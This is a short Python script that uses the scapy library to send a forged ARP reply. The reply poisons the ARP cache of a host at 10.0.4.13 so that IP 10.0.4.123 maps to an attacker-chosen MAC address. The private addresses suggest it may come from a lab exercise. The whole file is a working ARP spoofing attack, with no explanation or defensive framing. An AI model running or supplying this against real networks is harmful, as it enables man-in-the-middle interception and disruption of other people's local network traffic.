from scapy.layers.l2 import ARP
from scapy.sendrecv import send


def sendArpPoisoning(destIp, poisonIpSrc, poisonMacSrc):
    send(ARP(op=2, pdst=destIp, psrc=poisonIpSrc, hwsrc=poisonMacSrc))


if __name__ == '__main__':
    sendArpPoisoning("10.0.4.13", "10.0.4.123", "00:01:02:03:04:50")
